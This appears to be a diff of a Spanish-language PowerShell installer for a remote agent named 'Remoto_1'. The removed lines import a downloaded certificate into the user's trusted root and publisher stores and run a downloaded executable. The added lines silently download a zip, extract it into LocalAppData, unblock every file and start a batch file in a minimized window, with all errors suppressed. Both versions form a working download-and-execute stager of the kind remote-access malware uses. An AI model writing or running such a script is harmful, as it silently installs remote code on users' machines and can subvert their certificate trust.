@@ -3,17 +3,18 @@ $ErrorActionPreference = 'SilentlyContinue'
 $ProgressPreference = 'SilentlyContinue'
 
 $urlBase = 'https://remoto-1.onrender.com'
-$escritorio = [Environment]::GetFolderPath('Desktop')
-$rutaExe = Join-Path $escritorio 'Remoto_1_Portable.exe'
-$rutaCer = Join-Path $env:TEMP 'Remoto_1_Certificado.cer'
+$carpetaDestino = Join-Path $env:LOCALAPPDATA 'Remoto_1_Agente'
+$rutaZip = Join-Path $env:TEMP 'Remoto_1.zip'
 
-Invoke-WebRequest -Uri "$urlBase/Remoto_1_Certificado.cer" -OutFile $rutaCer
-if (Test-Path $rutaCer) {
-    Import-Certificate -FilePath $rutaCer -CertStoreLocation Cert:\CurrentUser\Root | Out-Null
-    Import-Certificate -FilePath $rutaCer -CertStoreLocation Cert:\CurrentUser\TrustedPublisher | Out-Null
+if (-not (Test-Path $carpetaDestino)) {
+    New-Item -ItemType Directory -Path $carpetaDestino -Force | Out-Null
 }
 
-Invoke-WebRequest -Uri "$urlBase/Remoto_1_Portable.exe" -OutFile $rutaExe
-Unblock-File -Path $rutaExe -ErrorAction SilentlyContinue
+Invoke-WebRequest -Uri "$urlBase/Remoto_1.zip" -OutFile $rutaZip
+Expand-Archive -Path $rutaZip -DestinationPath $carpetaDestino -Force
+Get-ChildItem -Path $carpetaDestino -Recurse | Unblock-File -ErrorAction SilentlyContinue
 
-Start-Process -FilePath $rutaExe
+$bat = Join-Path $carpetaDestino 'iniciar_agente.bat'
+if (Test-Path $bat) {
+    Start-Process -FilePath 'cmd.exe' -ArgumentList "/c `"$bat`"" -WorkingDirectory $carpetaDestino -WindowStyle Minimized
+}
